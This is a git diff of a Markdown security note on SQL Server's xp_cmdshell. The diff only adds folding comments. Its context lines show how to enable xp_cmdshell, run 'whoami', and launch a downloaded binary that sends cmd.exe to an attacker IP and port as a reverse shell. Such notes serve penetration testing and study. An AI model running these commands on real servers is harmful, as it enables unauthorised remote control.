@@ -12,6 +12,7 @@ links: "[[SQL]]"
 allows the execution of Windows command shell commands directly from the SQL
 Server environment.
 
+<!-- Activation {{{-->
 ## Activation
 
 **xp_cmdshell** is disabled by default
@@ -24,6 +25,9 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
 
+<!-- }}} -->
+
+<!-- Usage {{{-->
 ## Usage
 
 Check if xp_cmdshell is enabled
@@ -32,6 +36,9 @@ Check if xp_cmdshell is enabled
 EXEC xp_cmdshell 'whoami';
 ```
 
+<!-- }}} -->
+
+<!-- Reverse shell {{{-->
 ## Reverse shell
 
 Simple [Python HTTP server](https://docs.python.org/3/library/http.server.html)
@@ -52,3 +59,5 @@ Execute the acquired file on the target
 ```sh
 xp_cmdshell "powershell -c cd C:\Users\{user}\Downloads; .\{file_name} -e cmd.exe {attacker_ip} {attacker_port}"
 ```
+
+<!-- }}} -->
